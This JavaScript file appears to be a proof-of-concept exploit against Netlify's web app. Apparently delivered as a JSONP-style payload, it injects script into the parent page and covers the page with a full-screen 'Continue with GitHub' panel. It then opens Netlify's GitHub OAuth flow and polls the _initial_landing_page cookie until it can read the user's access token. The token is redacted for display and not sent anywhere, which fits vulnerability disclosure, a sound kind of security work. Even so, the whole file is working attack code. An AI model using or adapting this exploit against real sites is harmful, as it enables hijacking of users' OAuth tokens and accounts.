/**/
(() => {
  try {
    const d = parent.document;
    const script = d.createElement("script");

    function parentPayload() {
      if (window.__netlifyParentPoc?.destroy) {
        window.__netlifyParentPoc.destroy();
      }

      const OAUTH_URL =
        "https://api.netlify.com/auth" +
        "?provider=github" +
        "&site_id=app.netlify.com" +
        "&tracking_session_id=afc7d48b-e925-432a-a170-9121236eda09" +
        "&login=true" +
        "&entry_point=direct" +
        "&browser_fingerprint=cbdb5739abc754bdcc16cbd4fb07cd0f" +
        "&device_fingerprint=bbbac72e6221cf088819fff54ca43b40" +
        "&redirect=" +
        encodeURIComponent("https://www.netlify.com/") +
        "&use_redirect=true";

      const ID = "netlify-parent-poc";
      let timer = null;
      let attempts = 0;
      let baselineCookie = "";

      function readState() {
        const match = document.cookie.match(
          /(?:^|;\s*)_initial_landing_page=([^;]*)/
        );

        if (!match) {
          return {
            cookieReadable: false,
            tokenReadable: false,
            cookieValue: "",
            token: ""
          };
        }

        let cookieValue = match[1];

        try {
          cookieValue = decodeURIComponent(cookieValue);
        } catch {}

        const tokenMatch = cookieValue.match(
          /(?:^|[?#&])access_token=([^&#]+)/
        );

        return {
          cookieReadable: true,
          tokenReadable: Boolean(tokenMatch),
          cookieValue,
          token: tokenMatch ? tokenMatch[1] : ""
        };
      }

      function redact(token) {
        if (!token) return "not found";
        if (token.length <= 8) return "[readable]";

        return (
          token.slice(0, 4) +
          "…" +
          token.slice(-4)
        );
      }

      const old = document.getElementById(ID);
      if (old) old.remove();

      const panel = document.createElement("div");
      panel.id = ID;

      panel.style.cssText = [
        "position:fixed",
        "inset:0",
        "z-index:2147483647",
        "display:flex",
        "flex-direction:column",
        "align-items:center",
        "justify-content:center",
        "gap:18px",
        "padding:30px",
        "box-sizing:border-box",
        "background:#fff",
        "color:#111",
        "font-family:system-ui,sans-serif",
        "text-align:center"
      ].join(";");

      const title = document.createElement("h1");
      title.textContent = "Parent-window OAuth PoC";

      const status = document.createElement("pre");
      status.style.cssText = [
        "font:18px monospace",
        "line-height:1.5",
        "padding:20px",
        "background:#f1f1f1",
        "border-radius:10px",
        "white-space:pre-wrap"
      ].join(";");

      const start = document.createElement("button");
      start.textContent = "Continue with GitHub";
      start.style.cssText = [
        "padding:16px 28px",
        "font-size:24px",
        "cursor:pointer"
      ].join(";");

      const close = document.createElement("button");
      close.textContent = "Close PoC";
      close.style.cssText = [
        "padding:10px 18px",
        "font-size:16px",
        "cursor:pointer"
      ].join(";");

      function updateBeforeClick() {
        const state = readState();

        status.textContent =
          "Main realm: " + (window === top) + "\n" +
          "Cookie readable before click: " +
          state.cookieReadable + "\n" +
          "Token readable before click: " +
          state.tokenReadable;
      }

      function inspectAfterClick() {
        attempts++;

        try {
          const state = readState();
          const changed =
            Boolean(state.cookieValue) &&
            state.cookieValue !== baselineCookie;

          status.textContent =
            "Main realm: " + (window === top) + "\n" +
            "Attempt: " + attempts + "\n" +
            "Cookie readable: " +
            state.cookieReadable + "\n" +
            "Cookie changed after click: " +
            changed + "\n" +
            "Token readable: " +
            state.tokenReadable;

          if (state.tokenReadable) {
            clearTimeout(timer);

            status.textContent +=
              "\nToken length: " + state.token.length +
              "\nRedacted token: " + redact(state.token) +
              "\n\nOAuth-token readability confirmed.";

            status.style.background = "#c8f7c5";
            document.documentElement.setAttribute(
              "data-oauth-token-readable",
              "true"
            );

            window.__netlifyParentPoc.result = {
              cookieReadable: true,
              cookieChanged: changed,
              tokenReadable: true,
              tokenLength: state.token.length,
              redactedToken: redact(state.token)
            };

            return;
          }
        } catch (error) {
          status.textContent =
            "Inspection error: " + error.message;
        }

        if (attempts < 120) {
          timer = window.setTimeout(
            inspectAfterClick,
            1000
          );
        } else {
          status.textContent +=
            "\n\nTimed out after 120 attempts.";
        }
      }

      start.addEventListener("click", function () {
        const initial = readState();

        baselineCookie = initial.cookieValue;
        attempts = 0;

        document.documentElement.setAttribute(
          "data-oauth-clicked",
          "true"
        );

        status.textContent =
          "OAuth clicked.\nWaiting for completion…";

        window.open(
          OAUTH_URL,
          "_blank",
          "noopener"
        );

        clearTimeout(timer);
        timer = window.setTimeout(
          inspectAfterClick,
          1000
        );
      });

      close.addEventListener("click", function () {
        window.__netlifyParentPoc.destroy();
      });

      panel.append(title, status, start, close);

      if (document.body) {
        document.body.appendChild(panel);
      } else {
        document.addEventListener(
          "DOMContentLoaded",
          () => document.body.appendChild(panel),
          { once: true }
        );
      }

      window.__netlifyParentPoc = {
        installed: true,
        result: null,

        inspect: readState,

        destroy() {
          clearTimeout(timer);
          document.getElementById(ID)?.remove();

          document.documentElement.removeAttribute(
            "data-parent-poc-installed"
          );
        }
      };

      document.documentElement.setAttribute(
        "data-parent-poc-installed",
        "true"
      );

      updateBeforeClick();
    }

    /*
     * Convert the function to source and parse it again inside the
     * parent document. Therefore its handlers and timers belong to
     * the persistent parent realm.
     */
    script.textContent =
      "(" + parentPayload.toString() + ")();";

    (d.head || d.documentElement).appendChild(script);

    const installed =
      parent.__netlifyParentPoc?.installed === true;

    console.log("Parent PoC installed:", installed);

    script.remove();
  } catch (error) {
    console.error("Parent PoC installation failed:", error);
  }
})();
//({"counts":{}})
